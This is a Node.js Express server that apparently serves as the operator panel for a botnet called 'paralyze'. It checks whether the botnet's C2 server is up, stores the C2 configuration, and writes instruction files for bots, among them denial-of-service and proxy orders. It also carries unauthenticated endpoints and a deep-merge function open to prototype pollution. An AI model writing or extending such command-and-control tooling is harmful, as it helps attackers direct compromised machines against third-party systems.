const express = require('express');
const fs = require('fs');
const path = require('path');

const mariadb = require('mariadb');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('.'));

function loadMariaConfig() {
  const config = {};
  const lines = fs.readFileSync('/path/to/paralyze/configs/db_controller.conf', 'utf8').split('\n');
  for (const line of lines) {
    const [key, value] = line.trim().split('=');
    if (key && value) config[key] = value;
  }
  return config;
}

function loadMongoConfig() {
  const content = fs.readFileSync('/path/to/paralyze/configs/config_module.json', 'utf8');
  return JSON.parse(content);
}

app.get('/api/status/db', async (req, res) => {
  let mariadbOK = false;
  let mongodbOK = false;

  try {
    const cfg = loadMariaConfig();
    const conn = await mariadb.createConnection({
      host: cfg.server,
      port: parseInt(cfg.port),
      user: cfg.user,
      password: cfg.password,
      database: cfg.database
    });
    await conn.query('SELECT 1');
    mariadbOK = true;
    await conn.end();
  } catch (err) {
    console.error('MariaDB error:', err.message);
  }

  try {
    const mcfg = loadMongoConfig();
    const mongo = new MongoClient(mcfg.general.uri);
    await mongo.connect();
    await mongo.db().admin().ping();
    mongodbOK = true;
    await mongo.close();
  } catch (err) {
    console.error('MongoDB error:', err.message);
  }

  res.json({ mariadb: mariadbOK, mongodb: mongodbOK });
});

app.get('/api/status/c2', async (req, res) => {
  let isC2Online = false;
  try {
    const c2Config = JSON.parse(fs.readFileSync('/path/to/paralyze/configs/control_server.json', 'utf8'));
    const address = c2Config.general.server.address;
    const port = c2Config.general.server.port;

    const net = require('net');
    const socket = new net.Socket();

    const timeout = 2000; 
    await new Promise((resolve, reject) => {
      socket.setTimeout(timeout);
      socket.once('error', reject);
      socket.once('timeout', reject);
      socket.connect(port, address, () => {
        isC2Online = true;
        socket.end();
        resolve();
      });
    });
  } catch (err) {
    console.error('C2 connection error:', err.message);
  }
  res.json({ c2: isC2Online });
});


app.post('/api/save-instruction-json', express.json(), (req, res) => {
  const { filename, content } = req.body;

  const FN_RE = /^[A-Za-z0-9_-]+\.json$/;
  if (!filename || !FN_RE.test(filename)) {
    return res.status(400).json({ success: false, error: 'Invalid filename' });
  }

  let instrPath;
  try {
    const raw = fs.readFileSync(path.join(__dirname, 'interface_settings.conf'), 'utf8');
    const cfg = raw.split(/\r?\n/).reduce((o, line) => {
      const [k,v] = line.split('=');
      if (k && v) o[k.trim()] = v.trim();
      return o;
    }, {});
    instrPath = cfg.instructions_path;
  } catch (err) {
    console.error('Failed to read interface_settings.conf', err);
    return res.status(500).json({ success: false, error: 'Server configuration error' });
  }

  if (!instrPath) {
    return res.status(500).json({ success: false, error: 'instructions_path not set' });
  }

  const baseDir = path.isAbsolute(instrPath)
    ? instrPath
    : path.join(__dirname, instrPath);
  try {
    fs.mkdirSync(baseDir, { recursive: true });
  } catch (err) {
    console.error('Failed to create instructions directory', err);
    return res.status(500).json({ success: false, error: 'Cannot access instructions directory' });
  }

  const fullPath = path.normalize(path.join(baseDir, filename));
  if (!fullPath.startsWith(path.normalize(baseDir + path.sep))) {
    return res.status(400).json({ success: false, error: 'Path traversal detected' });
  }

  try {
    fs.writeFileSync(fullPath, content, 'utf8');
    return res.json({ success: true, path: fullPath });
  } catch (err) {
    console.error('Error saving JSON file:', err);
    return res.status(500).json({ success: false, error: 'Failed to save file' });
  }
});

app.post('/api/instructions', express.json(), (req, res) => {
  const instructions = req.body.instructions ?? req.body;  
  console.log('Received instructions:', instructions);

  let instrPath;
  try {
    const raw = fs.readFileSync(
      path.join(__dirname, 'interface_settings.conf'),
      'utf8'
    );
    const cfg = raw.split(/\r?\n/).reduce((o, line) => {
      const [k, v] = line.split('=');
      if (k && v) o[k.trim()] = v.trim();
      return o;
    }, {});
    instrPath = cfg.instructions_path;
    if (!instrPath) throw new Error('instructions_path not set in config');
  } catch (err) {
    console.error('Could not read interface_settings.conf:', err);
    return res.status(500).json({ success: false, error: err.message });
  }

  const baseDir = path.isAbsolute(instrPath)
    ? instrPath
    : path.join(__dirname, instrPath);
  try {
    fs.mkdirSync(baseDir, { recursive: true });
  } catch (err) {
    console.error('Failed to create instructions directory:', err);
    return res
      .status(500)
      .json({ success: false, error: 'Cannot access instructions directory' });
  }

  const fileMap = {
    dos:         'dos_instructions.json',
    init:        'init_instructions.json',
    proxy:       'proxy_instructions.json',
    maintenance: 'maintenance_instructions.json'
  };

  try {
    for (const [key, data] of Object.entries(instructions)) {
      const filename = fileMap[key];
      if (!filename) continue;  
      const fullPath = path.join(baseDir, filename);
      fs.writeFileSync(fullPath, JSON.stringify(data, null, 2), 'utf8');
      console.log(`Saved ${key} instructions to ${fullPath}`);
    }
    return res.json({ success: true });
  } catch (err) {
    console.error('Error saving instruction files:', err);
    return res
      .status(500)
      .json({ success: false, error: 'Failed to save instruction files' });
  }
});


app.post('/save-settings', express.json(), (req, res) => {
  const settings = req.body;

  const filePath = path.join(__dirname, 'interface_settings.conf');

  let configLines = '';
  for (const [key, value] of Object.entries(settings)) {
      configLines += `${key}=${value}\n`;
  }

  fs.writeFile(filePath, configLines, 'utf8', (err) => {
      if (err) {
          console.error('Error saving settings:', err);
          return res.status(500).json({ success: false, message: 'Failed to save settings.' });
      }

      res.status(200).json({ success: true, message: 'Settings saved successfully.' });
  });
});

app.get('/get-instruction-path', (req, res) => {
  const filePath = path.join(__dirname, 'interface_settings.conf');

  fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) return res.status(500).json({ error: 'Failed to read settings.' });

      const lines = data.split('\n');
      const config = {};
      for (const line of lines) {
          const [key, value] = line.split('=');
          if (key && value) config[key.trim()] = value.trim();
      }

      res.json({ instructions_path: config.instructions_path });
  });
});

function mergeDeep(target, source) {
  for (const key of Object.keys(source)) {
    const srcVal = source[key];
    if (
      srcVal && 
      typeof srcVal === 'object' &&
      !Array.isArray(srcVal)
    ) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      mergeDeep(target[key], srcVal);
    } else {
      target[key] = srcVal;
    }
  }
  return target;
}

app.post('/api/c2-config', (req, res) => {
  let settings;
  try {
    const raw = fs.readFileSync(
      path.join(__dirname, 'interface_settings.conf'),
      'utf8'
    );
    settings = raw
      .split(/\r?\n/)
      .reduce((o, line) => {
        const [k, v] = line.split('=');
        if (k && v) o[k.trim()] = v.trim();
        return o;
      }, {});
  } catch (err) {
    console.error('Could not read interface_settings.conf:', err);
    return res
      .status(500)
      .json({ success: false, error: 'Server misconfiguration' });
  }

  const c2Path = settings.c2_path;
  if (!c2Path) {
    return res
      .status(500)
      .json({ success: false, error: 'c2_path not set' });
  }

  const FN_RE = /^[A-Za-z0-9_\-\/]+\.json$/;
  if (!FN_RE.test(c2Path)) {
    return res
      .status(400)
      .json({ success: false, error: 'Invalid c2_path' });
  }

  const fullPath = path.isAbsolute(c2Path)
    ? c2Path
    : path.join(__dirname, c2Path);

  const dir = path.dirname(fullPath);
  try {
    fs.mkdirSync(dir, { recursive: true });
  } catch (err) {
    console.error('Failed to create C2 config directory:', err);
    return res
      .status(500)
      .json({ success: false, error: 'Cannot write to path' });
  }

  let current = {};
  if (fs.existsSync(fullPath)) {
    try {
      const txt = fs.readFileSync(fullPath, 'utf8');
      current = JSON.parse(txt);
    } catch (err) {
      console.error('Could not parse existing C2 config:', err);
      current = {};
    }
  }

  const updated = mergeDeep(current, req.body);
  console.log('Merged C2 config:', updated);

  try {
    fs.writeFileSync(
      fullPath,
      JSON.stringify(updated, null, 2),
      'utf8'
    );
    return res.json({ success: true, path: fullPath });
  } catch (err) {
    console.error('Error writing C2 config:', err);
    return res
      .status(500)
      .json({ success: false, error: 'Failed to save C2 config' });
  }
});

app.post('/api/shutdown', async (req, res) => {
  console.log("Shutdown requested");
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
